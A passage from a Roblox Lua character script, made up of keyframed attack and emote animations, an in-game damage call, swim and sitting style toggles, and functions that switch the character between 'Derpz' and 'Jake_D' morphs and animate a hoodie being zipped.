Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(3.8),math.rad(45.7),math.rad(-8.9))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(-9.9),math.rad(35),math.rad(1.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-0.9,-0.3)*angles(math.rad(9.9),math.rad(-39.8),math.rad(15.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.7,0.2,-1.2)*angles(math.rad(95.7),math.rad(-17.3),math.rad(41.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.9,0.6,-0.5)*angles(math.rad(91),math.rad(-12.7),math.rad(-41.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18.3),math.rad(-8),math.rad(-45.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 6

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
Animate(RootJoint,cf(0,0,0.2)*angles(math.rad(3.2),math.rad(46.7),math.rad(-9.1))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(-10.2),math.rad(35),math.rad(-0.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-0.9,-0.3)*angles(math.rad(12.7),math.rad(-39.2),math.rad(17.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.8,-0.6,-0.8)*angles(math.rad(150.1),math.rad(49.4),math.rad(23.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.1,-0.2)*angles(math.rad(89),math.rad(0),math.rad(-19.1)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18.6),math.rad(-9.2),math.rad(-46.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 7

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .23
Animate(RootJoint,cf(0,0.9,-0.6)*angles(math.rad(-12.8),math.rad(46.7),math.rad(-9.1))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1.1,0.2)*angles(math.rad(-13.6),math.rad(36),math.rad(-20.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.3,-1.2,-0.3)*angles(math.rad(-47.3),math.rad(-33.6),math.rad(-25.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,1.5,-0.5)*angles(math.rad(134.9),math.rad(45.4),math.rad(34.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,0.4,0.7)*angles(math.rad(18.8),math.rad(-0.9),math.rad(28.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(5),math.rad(0.8),math.rad(-46.8)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 8

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,1,-1.6)*angles(math.rad(-23.3),math.rad(7),math.rad(-33))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(-46.5),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.7,-0.6,-0.5)*angles(math.rad(40.2),math.rad(22.1),math.rad(24))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.9,1.4,-0.2)*angles(math.rad(122.6),math.rad(-62.9),math.rad(31.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,0.4,0.7)*angles(math.rad(-18.8),math.rad(-18.8),math.rad(21.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(11.4),math.rad(24.4),math.rad(-3.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 9
MagniDamage(tors,5,15,25,0,"Normal")
soundeffectecho(260430117,0.95,tors,10,0,"e",10,.02)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .4
Animate(RootJoint,cf(-0.7,-0.8,-2)*angles(math.rad(-47.7),math.rad(3.3),math.rad(-1.4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.1,-0.4)*angles(math.rad(36.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-1.3)*angles(math.rad(-30.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.9,0.9,-1.4)*angles(math.rad(54.2),math.rad(0),math.rad(18.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,-0.6,-0.4)*angles(math.rad(42.3),math.rad(10.3),math.rad(3.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-0),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
--Repeat frame 9

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .1
Animate(RootJoint,cf(-0.7,-0.8,-2)*angles(math.rad(-47.7),math.rad(3.3),math.rad(-1.4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.1,-0.4)*angles(math.rad(36.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-1.3)*angles(math.rad(-30.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.9,0.9,-1.4)*angles(math.rad(54.2),math.rad(0),math.rad(18.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,-0.6,-0.4)*angles(math.rad(42.3),math.rad(10.3),math.rad(3.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-0),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)



--KEYFRAME 10

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(-0.6,-0.7,-1.7)*angles(math.rad(-15.6),math.rad(2),math.rad(-3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.2,-0.5)*angles(math.rad(15.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-1.3)*angles(math.rad(-30.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.3,-0.6)*angles(math.rad(18),math.rad(-14.9),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.7,0.5,-0.4)*angles(math.rad(11.6),math.rad(20),math.rad(8.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-0),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--KEYFRAME 11

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .15
Animate(RootJoint,cf(0,0,-1.2)*angles(math.rad(-3.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1.2,-0.7)*angles(math.rad(10.5),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,-0.5)*angles(math.rad(-21.2),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.5,0)*angles(math.rad(14.4),math.rad(-10.6),math.rad(-6.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,-0.2)*angles(math.rad(7.6),math.rad(7),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(4.9),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
hum.WalkSpeed = storehumanoidWS
attack = false
end
aerrtee = 0
freefall = 0
--Ability Storage
swimtypenum = 1
function swimtypechange()
swimtypenum = swimtypenum + 1
if swimtypenum == 1 then
SwimType = swimtypenum
--chatfunc("Changed to front crawl.",25,MAINRUINCOLOR.Color)
elseif swimtypenum == 2 then
SwimType = swimtypenum
--chatfunc("Changed to back stroke.",25,MAINRUINCOLOR.Color)
elseif swimtypenum == 3 then
SwimType = swimtypenum
--chatfunc("Changed to butterfly.",25,MAINRUINCOLOR.Color)
elseif swimtypenum == 4 then
SwimType = swimtypenum
--chatfunc("Changed to that one stroke i can't actually name due to roblox.",25,MAINRUINCOLOR.Color)
elseif swimtypenum == 5 then
SwimType = 1
swimtypenum = 1
--chatfunc("Changed to front crawl.",25,MAINRUINCOLOR.Color)
end
end
sittingstyle = 1
function sittingstylechange()
sittingstyle = sittingstyle + 1

if sittingstyle == 6 then
sittingstyle = 1
end
end

function dmgfuncdeath()
dmg(char)
end
function biga()
Animate(RW,cf(1.5,0.5,0)*angles(math.rad(152.4),math.rad(0),math.rad(0)),1,Enum.EasingStyle.Back,Enum.EasingDirection.InOut) wait(animatetime)
end
function magicattack()
attack = true
Animate(LW,cf(-0.7,0.5,-0.9)*angles(math.rad(90),math.rad(-7.3),math.rad(77.5)),.5,Enum.EasingStyle.Exponential,Enum.EasingDirection.InOut)
for i = 0, 2, 0.1 do
swait()
local Alpha = .5
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0),math.rad(-23.9),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(0),math.rad(31.2),math.rad(-8.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(-2.6),math.rad(-44.6),math.rad(4.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)

Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(-0.1,0,0)*angles(math.rad(0),math.rad(22.7),math.rad(-6.5))*necko,Alpha)
end

 Animate(RW,cf(1.4,0.7,0.2)*angles(math.rad(-2.6),math.rad(-23.8),math.rad(24.8)),1,Enum.EasingStyle.Exponential,Enum.EasingDirection.In) wait(animatetime)
Animate(LW,cf(-1.3,0.8,0.4)*angles(math.rad(54),math.rad(9.4),math.rad(-89)),.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
 Animate(RW,cf(1.3,0.7,0.3)*angles(math.rad(-11.7),math.rad(-53.2),math.rad(18.4)),.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
for i = 0, 7, 0.1 do
swait()
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-11.3),math.rad(41.1),math.rad(7.5))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(-7.1),math.rad(18.7),math.rad(-17.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.2,-1.1,-0.2)*angles(math.rad(9.6),math.rad(-46.1),math.rad(16.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(-0.1,0,0.1)*angles(math.rad(-9.9),math.rad(-37.9),math.rad(-4.5))*necko,Alpha)
end
attack = false
end
function easports()
attack = true
for i = 0, 3, 0.1 do
swait()
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0.1,-0.3,-0.2)*angles(math.rad(-19),math.rad(-21.4),math.rad(-7.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(-15),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.6,-0.5)*angles(math.rad(19.4),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.2,0.2,-0.4)*angles(math.rad(48.5),math.rad(0),math.rad(71.6)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.1,0.2,-0.4)*angles(math.rad(53.3),math.rad(0),math.rad(-75.8)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0.2,0,0.2)*angles(math.rad(-14.3),math.rad(19.7),math.rad(9.9))*necko,Alpha)
end
--Anim 1
Animate(RootJoint,cf(-0.3,0,-0.1)*angles(math.rad(-12.1),math.rad(32.5),math.rad(-1.6))*RootCF,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
 Animate(Torso.Neck,cf(0.1,0,0.2)*angles(math.rad(-11.8),math.rad(9.8),math.rad(5))*necko,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LH,cf(-0.8,-0.4,-0.6)*angles(math.rad(-44),math.rad(9.7),math.rad(-11.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
 Animate(RH,cf(1.1,-1,-0.3)*angles(math.rad(-21.5),math.rad(-16.2),math.rad(17.9))*angles(math.rad(0),math.rad(90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LW,cf(-1.3,0.7,0.3)*angles(math.rad(48.5),math.rad(0),math.rad(-47.7)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
 Animate(RW,cf(1.4,0.7,0.3)*angles(math.rad(53.3),math.rad(0),math.rad(43)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In) wait(animatetime)
--Anim 2
Animate(RootJoint,cf(-0.3,0,-0.1)*angles(math.rad(140.6),math.rad(67.4),math.rad(-157.7))*RootCF,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
 Animate(Torso.Neck,cf(0,0,0.2)*angles(math.rad(-10.3),math.rad(0.7),math.rad(0.9))*necko,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LH,cf(-1,-1,0)*angles(math.rad(-3.7),math.rad(0),math.rad(-14.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
 Animate(RH,cf(1,-0.6,-0.5)*angles(math.rad(19.4),math.rad(0),math.rad(23.9))*angles(math.rad(0),math.rad(90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LW,cf(-1,0.8,0.4)*angles(math.rad(48.5),math.rad(0),math.rad(-92.7)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
 Animate(RW,cf(1.1,0.8,0.4)*angles(math.rad(53.3),math.rad(0),math.rad(82.8)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In) wait(animatetime)
--Anim 3
 Animate(RootJoint,cf(0.3,-0.1,-0.1)*angles(math.rad(162),math.rad(-4.5),math.rad(-171.6))*RootCF,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LH,cf(-1.2,-0.9,-0.3)*angles(math.rad(-29.7),math.rad(1.9),math.rad(-29.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(RH,cf(1,-1.4,-0.2)*angles(math.rad(-21.5),math.rad(-16.2),math.rad(-12.6))*angles(math.rad(0),math.rad(90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LW,cf(-1.5,0.8,0.4)*angles(math.rad(48.5),math.rad(0),math.rad(-92.7)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(RW,cf(1.4,0.8,0.4)*angles(math.rad(53.3),math.rad(0),math.rad(82.8)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(Torso.Neck,cf(-0.1,0,0.2)*angles(math.rad(-9.5),math.rad(-8.5),math.rad(-2.9))*necko,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In) wait(animatetime)
--Anim 4
 Animate(RootJoint,cf(0.6,0.3,-0.4)*angles(math.rad(-176.7),math.rad(-68.4),math.rad(-168.9))*RootCF,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LH,cf(-1.2,-1.1,-0.3)*angles(math.rad(-0.3),math.rad(-13.9),math.rad(-13))*angles(math.rad(0),math.rad(-90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(RH,cf(1.2,-0.5,-0.5)*angles(math.rad(41.6),math.rad(-18.8),math.rad(8.3))*angles(math.rad(0),math.rad(90),math.rad(0)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(LW,cf(-2,0.7,0.3)*angles(math.rad(48.5),math.rad(0),math.rad(-40.2)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(RW,cf(1.7,0.7,0.2)*angles(math.rad(53.3),math.rad(0),math.rad(40)),.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In)
Animate(Torso.Neck,cf(-0.1,0,0.2)*angles(math.rad(-8.7),math.rad(6.8),math.rad(-2.9))*necko,.2,Enum.EasingStyle.Linear,Enum.EasingDirection.In) wait(animatetime)
--Anim 5
 Animate(RootJoint,cf(0,-0.9,-0.6)*angles(math.rad(-12.8),math.rad(14.3),math.rad(0))*RootCF,.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
Animate(LH,cf(-1,-0.1,-0.6)*angles(math.rad(12.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
Animate(RH,cf(1,-1.2,-0.3)*angles(math.rad(-52.7),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
Animate(LW,cf(-1.6,0.5,0.4)*angles(math.rad(75.4),math.rad(7.8),math.rad(-76.8)),.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
Animate(RW,cf(1.4,0.6,-0.3)*angles(math.rad(-8.6),math.rad(29),math.rad(17.4)),.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
Animate(Torso.Neck,cf(0,0,0)*angles(math.rad(0),math.rad(-15.8),math.rad(0))*necko,.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out) wait(animatetime)
wait(1)
attack = false
end
function ragdolldeath()
hum.Health = 0
headmovementenabled = false
Ragdoll(char,Torso,true)
end




function DerpzMorphTrans(trans)
for i,v in pairs (DerpzMorphTORS:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorphLARM:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorphRARM:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorphLLEG:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorphRLEG:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end



end
function TailTrans(trans)
for i,v in pairs (DerpzTail:GetChildren()) do
if v.Name ~= "Main" then
v.Transparency = trans
end
end
end
function DerpzMorph2Trans(trans)
for i,v in pairs (DerpzMorph2TORS:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorph2LARM:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorph2RARM:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorph2LLEG:GetDescendants()) do
if v.Name ~= "main"and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (DerpzMorph2RLEG:GetDescendants()) do
if v.Name ~= "main" and v.ClassName ~= "Weld" then
v.Transparency = trans
end
end



end

function JakeMorphTrans(trans)
for i,v in pairs (JakeMorphTORS:GetDescendants()) do
if v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (JakeMorphLARM:GetDescendants()) do
if v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (JakeMorphRARM:GetDescendants()) do
if v.ClassName ~= "Weld" then
v.Transparency = trans
end
end
for i,v in pairs (JakeMorphLLEG:GetDescendants()) do
if v.ClassName ~= "Weld" and v.Name ~= "Mesh" then
v.Transparency = trans
end
end
for i,v in pairs (JakeMorphRLEG:GetDescendants()) do
if v.ClassName ~= "Weld" and v.Name ~= "Mesh" then
v.Transparency = trans
end
end



end

JakeD_EyeColor = Color3.fromRGB(0, 0, 143 - 80 * math.cos(sine/40))
Derpz_EyeColor = Color3.fromRGB(0, 0, 255 - 100* math.cos(sine/30))


local hoodval = false
DerpzMorphTrans(1)
JakeMorphTrans(1)
function ChangeChar()
attack = true
if MorphedInto == "Derpz" then
MorphedInto = "Jake_D"
chatfunc("Changed into "..MorphedInto,10,BrickColor.new("Bright green").Color)
DerpzMorphTrans(1)
DerpzMorph2Trans(1)
JakeMorphTrans(0)
TailTrans(1)
DerpzMorphLARM.Parent.Hed.Ears.Transparency = 1
elseif MorphedInto == "Jake_D" then
MorphedInto = "Derpz"
chatfunc("Changed into "..MorphedInto,10,BrickColor.new("Bright green").Color)
DerpzMorphLARM.Parent.Hed.Ears.Transparency = 1
if hoodval == false then
DerpzMorphTrans(1)
DerpzMorph2Trans(0)
elseif hoodval == true then
DerpzMorphTrans(0)
DerpzMorph2Trans(1)
end
TailTrans(0)
JakeMorphTrans(1)
end
if MorphedInto == "Derpz" then
local derpz = Character:GetChildren()
for i=1, #derpz do 
if (derpz[i].className == "Accessory") then 
derpz[i].Parent = nil
elseif (derpz[i].className == "Shirt") then
derpz[i].Parent = nil
elseif (derpz[i].className == "Pants") then
derpz[i].Parent = nil
elseif (derpz[i].className == "CharacterMesh") then
derpz[i].Parent = nil
elseif (derpz[i].className == "ShirtGraphic") then
derpz[i].Parent = nil

end 

end

local clothesa = game:GetService("ServerStorage")["morph (Derpz) for "..plr.Name]:Clone()
local clothes1 = clothesa:GetChildren()
for i=1, #clothes1 do 
if (clothes1[i].className == "Accessory") then 
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Shirt") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Pants") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "BodyColors") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "CharacterMesh") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "ShirtGraphic") then
clothes1[i].Parent = Character
end 

end
--else

--end
elseif MorphedInto == "Jake_D" then

local derpz = Character:GetChildren()
for i=1, #derpz do 
if (derpz[i].className == "Accessory") then 
derpz[i].Parent = nil
elseif (derpz[i].className == "Shirt") then
derpz[i].Parent = nil
elseif (derpz[i].className == "Pants") then
derpz[i].Parent = nil
elseif (derpz[i].className == "CharacterMesh") then
derpz[i].Parent = nil
elseif (derpz[i].className == "ShirtGraphic") then
derpz[i].Parent = nil

end 

end

local clothesa = game:GetService("ServerStorage")["morph (Jake) for "..plr.Name]:Clone()
local clothes1 = clothesa:GetChildren()
for i=1, #clothes1 do 
if (clothes1[i].className == "Accessory") then 
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Shirt") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Pants") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "BodyColors") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "CharacterMesh") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "ShirtGraphic") then
clothes1[i].Parent = Character
end 

end
end
attack = false
end
function unzip() --HOODIE, NOT WHATEVER YOU MIGHT THINK YOU DIRTY MINDED HECK
if MorphedInto == "Derpz" then
attack = true
hum.WalkSpeed = 0
if hoodval== false then
for i = 0, 1, 0.1 do
swait()
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0),math.rad(-3.8),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-0.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(-10.3),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.1,-0.3)*angles(math.rad(74.6),math.rad(17.8),math.rad(76.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(4.3)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,0.5)*angles(math.rad(-32.6),math.rad(6.6),math.rad(0.3))*necko,Alpha)
end
soundeffect(157869722,1.05,tors,4,0,"zip")
hoodval = true
DerpzMorphTrans(0)
DerpzMorph2Trans(1)
for i = 0, 2, 0.1 do
swait()
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0.3),math.rad(-10.7),math.rad(2.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.9,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(-10.3),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.1,-0.3)*angles(math.rad(67.4),math.rad(-12.5),math.rad(76.6)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(2)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,0.6)*angles(math.rad(-37.8),math.rad(6.6),math.rad(0.9))*necko,Alpha)
end

for i = 0, 4, 0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0.6),math.rad(-19.4),math.rad(2.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.9,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(-10.3),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.7,0,-0.2)*angles(math.rad(62.2),math.rad(-21.1),math.rad(59.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(0.9)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,0.6)*angles(math.rad(-40.1),math.rad(6.6),math.rad(1.1))*necko,Alpha)
end
for i = 0, 10, 0.1 do
swait()
local Alpha = .05
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0.6),math.rad(-19.4),math.rad(-0.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.9,0)*angles(math.rad(0),math.rad(-10.3),math.rad(3.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.3,0)*angles(math.rad(0),math.rad(0),math.rad(-7.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(3.5)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0.1,0,0.1)*angles(math.rad(-5.7),math.rad(18.3),math.rad(3.2))*necko,Alpha)
end
else
hoodval = false

for i = 0, 1, 0.1 do
swait()
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0.6),math.rad(-19.4),math.rad(2.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.9,0)*angles(math.rad(2.9),math.rad(19.2),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(-10.3),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.7,0,-0.2)*angles(math.rad(62.2),math.rad(-21.1),math.rad(59.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(0.9)),Alpha)
